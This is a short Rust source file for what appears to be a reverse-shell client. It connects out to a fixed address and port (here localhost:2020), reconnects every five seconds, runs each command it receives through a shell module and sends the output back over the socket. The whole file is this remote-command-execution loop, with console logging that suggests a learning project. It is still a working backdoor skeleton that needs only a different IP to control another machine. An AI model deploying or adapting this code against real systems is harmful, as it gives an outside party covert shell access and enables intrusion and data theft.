mod network;
mod shell;

use crate::network::Connection;
use std::{
    thread,
    time::{self, Duration},
};

const PORT: u16 = 2020;
const IP_ADDRESS: &str = "127.0.0.1";
const TIMEOUT: Duration = time::Duration::from_millis(5000);
const CHUNK_SIZE: usize = 4096;
fn main() {
    let mut connection = Connection::new(IP_ADDRESS.to_string(), PORT);
    loop {
        if let Ok(_) = connection.try_connect() {
            println!("Connection established");
        } else {
            println!("Failed to connect. Retrying...");
            thread::sleep(TIMEOUT);
            continue;
        }

        match connection.read_stream() {
            Ok(command) => {
                println!("{}", command.trim());

                let output = match shell::execute_command(command.trim()) {
                    Ok(output) => output,
                    Err(e) => e,
                };

                let padded_command = format!("{:<width$}", output.trim(), width = CHUNK_SIZE);

                if let Err(e) = connection.write_stream(padded_command) {
                    println!("Failed to send output: {}", e);
                    thread::sleep(TIMEOUT);
                } else {
                    println!("Output sent");
                }
            }
            Err(e) => {
                println!("Failed to read command: {}", e);
                thread::sleep(TIMEOUT);
            }
        }
    }
    // let output = shell::execute_command("cd ./src");
    // println!("{}", output.unwrap());
}
